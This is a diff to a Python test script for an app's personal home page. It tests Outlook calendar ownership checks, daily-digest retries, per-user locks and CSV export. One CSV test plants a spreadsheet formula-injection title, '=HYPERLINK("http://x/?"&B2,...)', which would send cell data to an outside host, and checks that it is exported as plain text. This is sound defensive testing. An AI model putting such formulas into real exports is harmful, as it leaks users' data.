@@ -112,7 +112,7 @@ except domain.HomeError as e:
 print('\n== 2. API da Home ==')
 bia = client_for('B111111', 'Bia Lead', 'BO')
 ana = client_for('A222222', 'Ana Admin', 'ADMIN')
-st, d = call(ana, 'post', '/api/projects', {'name': 'Proj', 'lead_sid': 'A222222'})
+st, d = call(ana, 'post', '/api/projects', {'name': 'Proj', 'lead_sid': 'A222222', 'category': 'Projects'})
 pid = d['project']['id']
 call(ana, 'post', '/api/projects/%s/tasks' % pid, {'title': 'Hoje', 'assignee_sid': 'B111111', 'due': T, 'priority': 'High'})
 st, d = call(bia, 'get', '/api/user-home')
@@ -134,6 +134,60 @@ call(ana, 'post', '/api/user-home/focus', {'action': 'end'})
 print('\n== 4. Sync fora do Windows ==')
 st, d = call(bia, 'post', '/api/user-home/sync')
 check('sem Outlook: 503 outlook_unavailable', (st, d.get('code')), (503, 'outlook_unavailable'))
+
+print('\n== 4b. o Outlook da máquina é de OUTRA pessoa ==')
+# O link do e-mail aponta para a máquina de quem o mandou: quem clica Sync ali
+# não é o dono do Outlook. Sem a conferência, a caixa que não abria caía no
+# calendário padrão do PERFIL e as reuniões do dono (título, participantes,
+# o link do Zoom com a senha) iam para a Home de outra pessoa.
+from apps.pages.features.user_home.infra import outlook as OL                # noqa: E402
+
+
+class _Rec(object):
+    Resolved = False
+
+    def Resolve(self):
+        pass
+
+
+class _NS(object):
+    CurrentUser = None                                  # GetExchangeUser falha: só as contas
+
+    def __init__(self, contas):
+        self.Accounts = [type('Acc', (), {'SmtpAddress': c})() for c in contas]
+
+    def CreateRecipient(self, email):
+        return _Rec()
+
+    def GetDefaultFolder(self, n):
+        return 'PADRAO-DO-PERFIL'
+
+
+def _cal(contas, email):
+    try:
+        return OL._calendar(_NS(contas), email)
+    except OL.CalendarNotAccessible:
+        return 'RECUSADO'
+
+
+check('o perfil é de quem clicou: o calendário padrão', _cal(['bia@example.com'], 'bia@example.com'), 'PADRAO-DO-PERFIL')
+check('   mesmo com o domínio trocado (jpmorgan × jpmchase)', _cal(['Bia@JPMChase.com'], 'bia@jpmorgan.com'), 'PADRAO-DO-PERFIL')
+check('o perfil é de OUTRA pessoa: recusa', _cal(['dono@example.com'], 'bia@example.com'), 'RECUSADO')
+check('sem e-mail na sessão: recusa (não dá para conferir)', _cal(['dono@example.com'], ''), 'RECUSADO')
+from apps.pages.features.user_home import commands as _UC                   # noqa: E402
+_orig_sync = _UC.sync
+
+
+def _sync_alheio(*a, **k):
+    raise OL.CalendarNotAccessible('bia@example.com')
+
+
+_UC.sync = _sync_alheio
+try:
+    st, d = call(bia, 'post', '/api/user-home/sync')
+finally:
+    _UC.sync = _orig_sync
+check('a API diz por código: 409 calendar_not_accessible', (st, d.get('code')), (409, 'calendar_not_accessible'))
 
 print('\n== 5. Settings ==')
 st, d = call(bia, 'get', '/api/settings')
@@ -167,11 +221,75 @@ with app.app_context():
     n = commands.due_digest(T)
 check('com "Due dates" desligado, nada', n, 0)
 
+print('\n== 7b. a leitura que falha DEVOLVE o dia ==')
+# O dia é reservado no claim ANTES de ler os projetos: reservado e não enviado
+# (o banco ocupado no share), ninguém tentaria de novo até amanhã.
+R._DAILY_METRIC_DIR = os.path.join(TMP, 'claims')
+_orig_digest = commands.due_digest
+
+
+def _digest_quebra(today):
+    raise IOError('banco ocupado')
+
+
+commands.due_digest = _digest_quebra
+try:
+    commands.run_once(datetime(2026, 10, 20, 8, 5))
+    check('a volta que falhou levanta (vai para o log)', False, True)
+except IOError:
+    check('a volta que falhou levanta (vai para o log)', True, True)
+commands.due_digest = lambda today: 7
+check('a volta seguinte, no mesmo dia, envia', commands.run_once(datetime(2026, 10, 20, 8, 10)), 7)
+check('   e a outra não envia de novo', commands.run_once(datetime(2026, 10, 20, 8, 15)), None)
+check('antes das 08:00 não é a hora', commands.run_once(datetime(2026, 10, 21, 7, 55)), None)
+check('sábado não tem aviso', commands.run_once(datetime(2026, 10, 24, 9, 0)), None)
+commands.due_digest = _orig_digest
+
 print('\n== 8. CSV das minhas tarefas ==')
 r = bia.get('/api/settings/export-tasks')
 txt = r.data.decode('utf-8')
 check('CSV da casa: BOM, `;` e três tarefas', (r.status_code, txt.startswith('﻿'), txt.count('\r\n') - 1, ';' in txt.split('\r\n')[0]),
       (200, True, 3, True))
+
+
+def _poe_formula(data):
+    p = data['projects'][0]
+    t = [x for x in p['tasks'] if x.get('assignee_sid') == 'B111111'][0]
+    t['title'] = '=HYPERLINK("http://x/?"&B2,"clique")'
+    t['subtasks'] = [{'id': 'S1', 'title': 'a', 'done': True}, {'id': 'S2', 'title': 'b', 'done': False},
+                     {'id': 'S3', 'title': 'c', 'done': False}]
+    return data
+
+
+pstore.mutate(_poe_formula)
+txt = bia.get('/api/settings/export-tasks').data.decode('utf-8')
+check('título que começa com = sai como TEXTO no CSV', "'=HYPERLINK" in txt and ';=HYPERLINK' not in txt, True)
+check('subtarefas como "1 of 3", não "1/3" (o Excel lê como data)', ('1 of 3' in txt, ';1/3;' in txt), (True, False))
+
+print('\n== 8c. a trava do armazém é POR PESSOA ==')
+# Uma trava única fazia a gravação de um (segundos no share) segurar a Home de
+# todo mundo — inclusive a presença dos colegas.
+import threading                                                            # noqa: E402
+check('mesma pessoa, mesma trava (sem caixa)', ustore._lock_of('b111111') is ustore._lock_of('B111111'), True)
+check('pessoas diferentes, travas diferentes', ustore._lock_of('B111111') is ustore._lock_of('A222222'), False)
+_segura, _solta, _leu = threading.Event(), threading.Event(), []
+
+
+def _grava_devagar():
+    with ustore._lock_of('B111111'):
+        _segura.set()
+        _solta.wait(10)
+
+
+th = threading.Thread(target=_grava_devagar)
+th.start()
+_segura.wait(5)
+leitor = threading.Thread(target=lambda: _leu.append(ustore.load('A222222')['sid']))
+leitor.start()
+leitor.join(5)
+check('a Ana lê a dela enquanto a da Bia está travada', _leu, ['A222222'])
+_solta.set()
+th.join(5)
 
 print('\n== 9. páginas pessoais ==')
 check('user-home e settings são sempre liberadas', {'/user-home', '/settings'} <= R._ALWAYS_ALLOWED_PATHS, True)
